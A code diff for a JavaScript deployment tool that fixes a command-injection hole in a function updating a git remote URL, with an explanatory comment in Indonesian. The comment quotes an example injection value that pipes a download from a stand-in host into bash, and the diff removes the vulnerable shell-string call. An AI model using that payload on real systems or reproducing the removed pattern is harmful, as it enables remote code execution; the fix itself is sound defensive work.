@@ -164,9 +164,20 @@ function stripCredentials(url) {
 /**
  * Update remote origin sebuah repo yang udah di-clone (dipakai kalau token lama
  * expired/direvoke, atau mau pindah akun GitHub buat repo yang sama).
+ *
+ * FIX (command injection): sebelumnya `url` ditempel ke string command lewat
+ * template literal (`git remote set-url origin "${url}"`) terus dijalanin
+ * lewat runAsUser() (sudo -u user bash -c '...'). Kutip GANDA di sekitar url
+ * TIDAK melindungi dari bash -c yang mem-parsing ulang isinya - endpoint
+ * POST /:name/credentials (manualUrl dari body request, TANPA whitelist
+ * regex sama sekali) bisa kirim url kayak `https://x"; curl evil.sh | bash; #`
+ * dan command tambahan itu BENERAN dieksekusi sebagai deployUser. Sekarang
+ * pakai runAsUserArgs() (execFileSync, argv terpisah) - persis pola yang
+ * sudah dipakai checkout()/log()/diffNameOnly() di file ini, url dikirim
+ * sebagai satu argv literal, gak pernah lewat parsing shell sama sekali.
  */
 function setRemoteUrl(projectPath, url, deployUser) {
-  return shell.runAsUser(deployUser, `git remote set-url origin "${url}"`, { cwd: projectPath });
+  return shell.runAsUserArgs(deployUser, 'git', ['remote', 'set-url', 'origin', url], { cwd: projectPath });
 }
 
 module.exports = {
